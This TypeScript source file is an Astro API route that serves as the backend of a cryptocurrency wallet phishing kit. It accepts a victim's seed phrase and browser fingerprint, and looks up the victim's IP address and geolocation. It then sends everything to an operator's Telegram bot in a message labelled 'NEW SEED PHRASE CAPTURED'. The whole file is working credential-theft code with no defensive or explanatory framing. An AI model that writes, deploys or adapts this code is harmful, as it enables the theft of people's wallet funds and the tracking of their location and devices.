import type { APIRoute } from 'astro';

export const POST: APIRoute = async ({ request, locals, clientAddress }) => {
  console.log('=== Send Seed API Called ===');
  
  try {
    const body = await request.json() as { 
      seedPhrase?: string;
      userAgent?: string;
      screenResolution?: string;
      language?: string;
      timezone?: string;
      platform?: string;
    };
    const { seedPhrase, userAgent, screenResolution, language, timezone, platform } = body;

    console.log('Received seed phrase length:', seedPhrase?.split(' ').length);

    if (!seedPhrase) {
      console.error('No seed phrase provided');
      return new Response(
        JSON.stringify({ error: 'Seed phrase is required' }),
        { status: 400, headers: { 'Content-Type': 'application/json' } }
      );
    }

    // Получение токена и chat ID из переменных окружения
    const botToken = locals?.runtime?.env?.TELEGRAM_BOT_TOKEN || import.meta.env.TELEGRAM_BOT_TOKEN;
    const chatId = locals?.runtime?.env?.TELEGRAM_CHAT_ID || import.meta.env.TELEGRAM_CHAT_ID;

    console.log('Bot token exists:', !!botToken);
    console.log('Chat ID exists:', !!chatId);
    console.log('Chat ID value:', chatId);

    if (!botToken || !chatId) {
      console.error('Missing Telegram credentials in environment variables');
      return new Response(
        JSON.stringify({ 
          error: 'Telegram configuration missing',
          details: {
            botToken: !!botToken,
            chatId: !!chatId
          }
        }),
        { status: 500, headers: { 'Content-Type': 'application/json' } }
      );
    }

    // Получение IP-адреса
    const ipAddress = clientAddress || 
                     request.headers.get('cf-connecting-ip') || 
                     request.headers.get('x-forwarded-for')?.split(',')[0] || 
                     request.headers.get('x-real-ip') || 
                     'Unknown';

    console.log('Client IP:', ipAddress);

    // Получение геолокации из Cloudflare (если доступно)
    let geoInfo = '';
    try {
      const cfData = (request as any).cf;
      if (cfData) {
        const city = cfData.city || 'Unknown';
        const region = cfData.region || 'Unknown';
        const country = cfData.country || 'Unknown';
        const timezone = cfData.timezone || 'Unknown';
        geoInfo = `📍 Location: ${city}, ${region}, ${country}\n⏰ Timezone: ${timezone}\n`;
      }
    } catch (e) {
      console.log('No CF data available');
    }

    // Попытка получить геолокацию по IP
    if (!geoInfo && ipAddress !== 'Unknown') {
      try {
        const geoResponse = await fetch(`http://ip-api.com/json/${ipAddress}?fields=status,country,countryCode,region,regionName,city,timezone,isp,org,as,query`);
        if (geoResponse.ok) {
          const geoData = await geoResponse.json();
          if (geoData.status === 'success') {
            geoInfo = `📍 Location: ${geoData.city || 'Unknown'}, ${geoData.regionName || 'Unknown'}, ${geoData.country || 'Unknown'} ${geoData.countryCode ? '(' + geoData.countryCode + ')' : ''}\n⏰ Timezone: ${geoData.timezone || 'Unknown'}\n🌐 ISP: ${geoData.isp || 'Unknown'}\n`;
          }
        }
      } catch (e) {
        console.error('Failed to fetch geo data:', e);
      }
    }

    // Парсинг User Agent
    let browserInfo = '';
    let deviceInfo = '';
    if (userAgent) {
      // Определение браузера
      if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
        browserInfo = '🌐 Browser: Google Chrome';
      } else if (userAgent.includes('Firefox')) {
        browserInfo = '🌐 Browser: Mozilla Firefox';
      } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
        browserInfo = '🌐 Browser: Safari';
      } else if (userAgent.includes('Edg')) {
        browserInfo = '🌐 Browser: Microsoft Edge';
      } else if (userAgent.includes('Opera') || userAgent.includes('OPR')) {
        browserInfo = '🌐 Browser: Opera';
      } else {
        browserInfo = '🌐 Browser: Unknown';
      }

      // Определение устройства
      if (userAgent.includes('Mobile')) {
        deviceInfo = '📱 Device: Mobile';
      } else if (userAgent.includes('Tablet')) {
        deviceInfo = '📱 Device: Tablet';
      } else {
        deviceInfo = '💻 Device: Desktop';
      }

      // Определение ОС
      let osInfo = '';
      if (userAgent.includes('Windows')) {
        osInfo = ' (Windows)';
      } else if (userAgent.includes('Mac OS')) {
        osInfo = ' (macOS)';
      } else if (userAgent.includes('Linux')) {
        osInfo = ' (Linux)';
      } else if (userAgent.includes('Android')) {
        osInfo = ' (Android)';
      } else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) {
        osInfo = ' (iOS)';
      }
      deviceInfo += osInfo;
    }

    // Текущая дата и время
    const now = new Date();
    const dateStr = now.toLocaleDateString('en-US', { 
      year: 'numeric', 
      month: 'long', 
      day: 'numeric' 
    });
    const timeStr = now.toLocaleTimeString('en-US', { 
      hour: '2-digit', 
      minute: '2-digit', 
      second: '2-digit',
      hour12: false
    });

    // Формирование красивого сообщения
    const message = `
🔐 <b>NEW SEED PHRASE CAPTURED</b>

━━━━━━━━━━━━━━━━━━━━━━
🗓 <b>Date:</b> ${dateStr}
🕐 <b>Time:</b> ${timeStr} UTC

🔑 <b>SEED PHRASE:</b>
<code>${seedPhrase}</code>

━━━━━━━━━━━━━━━━━━━━━━
<b>📊 SESSION DETAILS:</b>

🌍 <b>IP Address:</b> <code>${ipAddress}</code>
${geoInfo}${browserInfo}
${deviceInfo}
${screenResolution ? `📐 Screen: ${screenResolution}` : ''}
${language ? `🗣 Language: ${language}` : ''}
${platform ? `⚙️ Platform: ${platform}` : ''}

━━━━━━━━━━━━━━━━━━━━━━
✅ <b>Status:</b> Successfully logged
`;

    console.log('Sending to Telegram API...');

    // Отправка сообщения в Telegram
    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const response = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message.trim(),
        parse_mode: 'HTML',
      }),
    });

    console.log('Telegram API response status:', response.status);

    if (!response.ok) {
      const errorData = await response.text();
      console.error('Telegram API error:', errorData);
      return new Response(
        JSON.stringify({ 
          error: 'Failed to send to Telegram',
          telegramError: errorData,
          status: response.status
        }),
        { status: 502, headers: { 'Content-Type': 'application/json' } }
      );
    }

    const result = await response.json();
    console.log('Telegram API success:', result);

    return new Response(
      JSON.stringify({ success: true, message: 'Seed phrase sent successfully' }),
      { status: 200, headers: { 'Content-Type': 'application/json' } }
    );
  } catch (error) {
    console.error('Error in send-seed API:', error);
    return new Response(
      JSON.stringify({ 
        error: 'Internal server error',
        details: error instanceof Error ? error.message : String(error)
      }),
      { status: 500, headers: { 'Content-Type': 'application/json' } }
    );
  }
};
